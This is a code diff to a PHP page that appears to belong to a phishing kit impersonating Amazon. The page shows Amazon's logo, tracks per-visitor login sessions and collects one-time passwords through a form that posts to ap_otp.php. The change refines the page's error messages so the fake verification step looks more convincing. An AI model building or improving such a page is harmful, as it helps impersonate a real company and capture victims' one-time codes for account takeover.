@@ -13,7 +13,16 @@ $sessions = load_login_sessions();
 $currentSession = $sessions[$currentSessionId] ?? [];
 
 $latestMeta = $currentSession['meta'] ?? [];
-$otpError = !empty($_GET['error']);
+$errorCode = isset($_GET['error']) ? (string)$_GET['error'] : '';
+$otpErrorMessage = '';
+
+if ($errorCode !== '') {
+    if ($errorCode === 'invalid') {
+        $otpErrorMessage = 'The verification code was not accepted. Please try again.';
+    } else {
+        $otpErrorMessage = 'The verification code is required. Please try again.';
+    }
+}
 ?>
 <!doctype html>
 <html class="a-no-js" data-19ax5a9jf="dingo">
@@ -98,8 +107,8 @@ $otpError = !empty($_GET['error']);
         <img src="https://images-na.ssl-images-amazon.com/images/G/01/gno/sprites/nav-sprite-global-1x-hm-dsk-reorg._CB405937547_.png" alt="Amazon" class="logo">
         <h1>Enter One-Time Password</h1>
         <p>A verification code was sent to your trusted device. Enter the one-time password below to continue.</p>
-        <?php if ($otpError): ?>
-            <div class="error">The verification code is required. Please try again.</div>
+        <?php if ($otpErrorMessage !== ''): ?>
+            <div class="error"><?php echo htmlspecialchars($otpErrorMessage, ENT_QUOTES, 'UTF-8'); ?></div>
         <?php endif; ?>
         <form class="otp-form" action="ap_otp.php" method="post">
             <label for="otp">One-time password</label>
